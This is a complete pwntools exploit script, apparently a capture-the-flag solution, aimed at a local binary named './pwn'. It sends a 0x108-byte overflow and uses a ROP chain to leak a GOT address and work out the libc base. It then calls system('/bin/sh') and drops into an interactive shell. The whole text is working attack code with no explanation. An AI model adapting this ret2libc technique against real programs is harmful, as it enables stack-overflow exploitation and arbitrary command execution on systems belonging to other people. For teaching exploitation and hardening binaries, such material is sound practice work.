from pwn import *
context.log_level='debug'
context.arch='amd64'
#context.terminal=['tmux','split','-h']
p=process('./pwn')
sla 		= lambda a,b: p.sendlineafter(a,b)
sa 		= lambda a,b: p.sendafter(a,b)
ra 		= lambda a: p.readuntil(a)
s		= lambda a: p.send(a)
sl		= lambda a: p.sendline(a)
rdi = 0x0000000000400643
rsi = 0x0000000000400641
got= 0x601018
write = 0x400466
libc = ELF("./pwn").libc
gdb.attach(p)
s("A"*0x108+flat([rdi,got,write,0x400596])+'\n')
p.readline()
s("A"*0x108+flat([0x400596])+'\n')

base = u64(p.read(6)+'\0\0')-libc.sym['printf']
log.warning(hex(base))
libc.address =base
sl("A"*0x108+flat([rdi,libc.search("/bin/sh").next(),libc.sym['system']]))
p.interactive()
